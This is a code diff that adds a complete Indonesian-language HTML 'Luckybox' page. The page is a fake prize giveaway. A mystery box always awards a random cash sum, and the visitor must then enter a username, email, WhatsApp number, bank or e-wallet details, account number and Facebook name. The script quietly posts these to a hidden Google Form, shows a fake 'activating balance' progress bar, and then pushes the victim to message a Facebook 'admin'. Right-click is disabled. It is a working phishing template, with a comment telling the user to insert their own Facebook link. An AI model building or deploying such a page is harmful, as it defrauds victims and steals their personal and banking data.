@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Luckybox - Kotak Keberuntungan</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif; text-align: center; 
+            background-color: #1a1a2e; color: white; margin: 0; padding: 20px;
+            user-select: none;
+        }
+        .container { max-width: 450px; margin: auto; background: #16213e; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .box-wrapper { position: relative; width: 200px; height: 200px; margin: 40px auto; perspective: 1000px; }
+        #mystery-box { width: 100%; height: 100%; cursor: pointer; transition: transform 0.3s; filter: drop-shadow(0 0 15px rgba(241, 196, 15, 0.3)); }
+        
+        .shake { animation: shake 0.5s infinite; }
+        @keyframes shake {
+            0%, 100% { transform: rotate(0deg); }
+            25% { transform: rotate(8deg); }
+            75% { transform: rotate(-8deg); }
+        }
+        .open-box { animation: open 0.8s forwards; }
+        @keyframes open {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.5); opacity: 0; visibility: hidden; }
+        }
+
+        #reward-display {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
+            font-size: 50px; font-weight: bold; color: #f1c40f; text-shadow: 0 0 20px rgba(241, 196, 15, 0.8);
+            transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 5;
+        }
+        #reward-display.show { transform: translate(-50%, -50%) scale(1.2); }
+
+        .form-daftar { display: none; text-align: left; background: #1f2945; padding: 20px; border-radius: 15px; margin-top: 20px; border: 1px solid #2e3a59; }
+        .form-daftar input, .form-daftar select {
+            width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box;
+        }
+        
+        button { 
+            padding: 15px 40px; font-size: 18px; font-weight: bold; cursor: pointer;
+            background-color: #e94560; color: white; border: none; border-radius: 50px;
+            box-shadow: 0 4px 0 #a22a3e; transition: 0.2s; margin-top: 20px; width: 100%;
+        }
+        button:disabled { background-color: #555 !important; box-shadow: none !important; cursor: not-allowed; }
+
+        /* Loading Bar Style */
+        .loading-container { display: none; margin-top: 20px; text-align: center; }
+        .progress-bg { width: 100%; background: #0f172a; border-radius: 10px; height: 12px; overflow: hidden; margin-bottom: 10px; border: 1px solid #2e3a59; }
+        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #f1c40f, #e67e22); transition: width 0.2s; box-shadow: 0 0 10px rgba(241,196,15,0.5); }
+        .loading-text { font-size: 13px; color: #f1c40f; font-weight: bold; }
+
+        /* Modal & FB Button */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); }
+        .modal-content { background: white; color: #333; margin: 10% auto; padding: 30px; border-radius: 15px; width: 85%; max-width: 380px; }
+        .btn-fb { 
+            display: flex; align-items: center; justify-content: center;
+            margin-top: 15px; padding: 15px; background: #1877F2; color: white; 
+            border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 16px;
+        }
+        .btn-fb img { width: 20px; margin-right: 10px; }
+        .btn-ok { display: block; margin-top: 10px; color: #666; text-decoration: none; font-size: 13px; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div class="container">
+        <h2 style="color: #f1c40f;">🎁 Luckybox 🎁</h2>
+        <p id="sub-title">Buka kotak untuk melihat saldo gratis Anda!</p>
+        
+        <div class="box-wrapper" id="boxArea">
+            <img id="mystery-box" src="https://cdn-icons-png.flaticon.com/512/679/679821.png" alt="Mystery Box" onclick="openBox()">
+            <div id="reward-display"></div>
+        </div>
+
+        <button id="actionBtn" onclick="openBox()">BUKA KOTAK SEKARANG</button>
+
+        <div id="registrationForm" class="form-daftar">
+            <h4 style="color:#f1c40f; text-align:center; margin-top:0;">Lengkapi Data Aktivasi Saldo</h4>
+            
+            <label style="font-size: 11px;">Username Akun (Min. 6 Karakter):</label>
+            <input type="text" id="regId" placeholder="agus123" required>
+            
+            <label style="font-size: 11px;">Email Aktif:</label>
+            <input type="email" id="regEmail" placeholder="contoh@email.com" required>
+            
+            <label style="font-size: 11px;">Nomor WhatsApp:</label>
+            <input type="text" id="regWa" value="+62" required>
+            
+            <label style="font-size: 11px;">Jenis Bank/E-Wallet:</label>
+            <select id="regBank" required>
+                <option value="">Pilih Bank</option>
+                <option value="BCA">BCA</option><option value="MANDIRI">MANDIRI</option>
+                <option value="BNI">BNI</option><option value="BRI">BRI</option>
+                <option value="DANA">DANA</option><option value="OVO">OVO</option>
+                <option value="GOPAY">GOPAY</option>
+            </select>
+            
+            <input type="text" id="regNamaRek" placeholder="Nama Rekening" required>
+            <input type="number" id="regNoRek" placeholder="No Rekening" required>
+            <input type="text" id="regNamaFB" placeholder="Nama Facebook" required>
+
+            <div id="loaderArea" class="loading-container">
+                <div class="loading-text" id="loadStatus">MENGHUBUNGKAN KE SERVER... <span id="percent">0%</span></div>
+                <div class="progress-bg">
+                    <div class="progress-fill" id="progBar"></div>
+                </div>
+            </div>
+            
+            <button id="submitBtn" onclick="submitToGoogle()" style="background:#27ae60; box-shadow: 0 4px 0 #1e8449;">KLAIM & AKTIVASI SEKARANG</button>
+        </div>
+
+        <div id="doneArea" style="display:none; margin-top: 20px;">
+            <h3 id="resultText" style="color:#f1c40f;"></h3>
+            <a href="LINK_FACEBOOK_KAMU_DISINI" class="btn-fb">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB">
+                KONFIRMASI KE FACEBOOK
+            </a>
+        </div>
+    </div>
+
+    <div id="resultModal" class="modal">
+        <div class="modal-content">
+            <h2 style="color:#27ae60; margin-top:0;">Aktivasi Berhasil!</h2>
+            <p>Data Anda telah dikunci sistem. <b>Wajib Konfirmasi</b> ke Facebook Admin untuk proses pencairan saldo.</p>
+            
+            <a href="LINK_FACEBOOK_KAMU_DISINI" class="btn-fb">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB">
+                HUBUNGI ADMIN SEKARANG
+            </a>
+            
+            <a href="#" onclick="location.reload()" class="btn-ok">Nanti Saja</a>
+        </div>
+    </div>
+
+    <script>
+        // Ganti link di bawah ini dengan link profil FB kamu
+        const facebookLink = "https://www.facebook.com/vipprimestore";
+        const prizes = ["100K", "150K", "200K", "250K", "300K"];
+        
+        function openBox() {
+            if (localStorage.getItem("boxDone") === "true") return;
+            document.getElementById('mystery-box').classList.add('shake');
+            document.getElementById('actionBtn').disabled = true;
+            document.getElementById('actionBtn').innerText = "MEMPROSES...";
+
+            setTimeout(() => {
+                document.getElementById('mystery-box').classList.remove('shake');
+                document.getElementById('mystery-box').classList.add('open-box');
+                const targetIdx = Math.floor(Math.random() * prizes.length);
+                const hasil = prizes[targetIdx];
+                document.getElementById('reward-display').innerText = "Rp " + hasil;
+                document.getElementById('reward-display').classList.add('show');
+                localStorage.setItem("tempWin", hasil);
+
+                setTimeout(() => {
+                    document.getElementById('boxArea').style.display = "none";
+                    document.getElementById('actionBtn').style.display = "none";
+                    document.getElementById('sub-title').innerHTML = "Selamat! Anda Menang <b style='color:#f1c40f;'>Rp "+hasil+"</b>";
+                    document.getElementById('registrationForm').style.display = "block";
+                }, 1000);
+            }, 2000);
+        }
+
+        document.getElementById('regWa').addEventListener('input', function() {
+            if (!this.value.startsWith('+62')) this.value = '+62';
+            this.value = '+62' + this.value.substring(3).replace(/\D/g, '');
+        });
+
+        function submitToGoogle() {
+            const id = document.getElementById('regId').value;
+            const email = document.getElementById('regEmail').value;
+            const wa = document.getElementById('regWa').value;
+            const bank = document.getElementById('regBank').value;
+            const nama = document.getElementById('regNamaRek').value;
+            const norek = document.getElementById('regNoRek').value;
+            const namafb = document.getElementById('regNamaFB').value;
+            const win = localStorage.getItem("tempWin") || "0";
+
+            if(!id || id.length < 6 || !email.includes('@') || wa.length < 12 || !bank || !nama || !norek) {
+                alert("Mohon lengkapi data dengan benar.");
+                return;
+            }
+
+            const btn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loaderArea');
+            const prog = document.getElementById('progBar');
+            const perc = document.getElementById('percent');
+            const statusLabel = document.getElementById('loadStatus');
+
+            btn.style.display = "none";
+            loader.style.display = "block";
+
+            let p = 0;
+            const interval = setInterval(() => {
+                p += Math.floor(Math.random() * 5) + 1;
+                if (p > 98) clearInterval(interval);
+                else {
+                    prog.style.width = p + "%";
+                    perc.innerText = p + "%";
+                    if(p > 40) statusLabel.innerHTML = "MENYIMPAN DATA KE SERVER... <span id='percent'>"+p+"%</span>";
+                    if(p > 80) statusLabel.innerHTML = "MENGAKTIVASI SALDO... <span id='percent'>"+p+"%</span>";
+                }
+            }, 80);
+
+            const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScGVtMxlLFQCWJjYJA_-ug8O32vaLPJSDSV2ICNfsDwFa9fIQ/formResponse";
+            const formData = new FormData();
+            formData.append('entry.498136123', id);    
+            formData.append('entry.2145381120', email); 
+            formData.append('entry.954302406', wa);    
+            formData.append('entry.1747382514', bank);  
+            formData.append('entry.371995109', nama);  
+            formData.append('entry.1836945173', norek); 
+            formData.append('entry.1660055715', namafb);   
+
+            fetch(googleFormURL, { method: 'POST', mode: 'no-cors', body: formData }).then(() => {
+                setTimeout(() => {
+                    prog.style.width = "100%";
+                    perc.innerText = "100%";
+                    localStorage.setItem("boxDone", "true");
+                    localStorage.setItem("boxWin", win);
+                    document.getElementById('resultModal').style.display = "block";
+                }, 1000);
+            }).catch(() => {
+                alert("Koneksi gagal.");
+                btn.style.display = "block";
+                loader.style.display = "none";
+            });
+        }
+
+        window.onload = () => {
+            if (localStorage.getItem("boxDone") === "true") {
+                const win = localStorage.getItem("boxWin");
+                document.getElementById('boxArea').style.display = "none";
+                document.getElementById('sub-title').style.display = "none";
+                document.getElementById('actionBtn').innerText = "KESEMPATAN HABIS";
+                document.getElementById('actionBtn').disabled = true;
+                document.getElementById('doneArea').style.display = "block";
+                document.getElementById('resultText').innerHTML = `STATUS: HADIAH Rp ${win} TERKUNCI`;
+            }
+        };
+    </script>
+</body>
+</html>
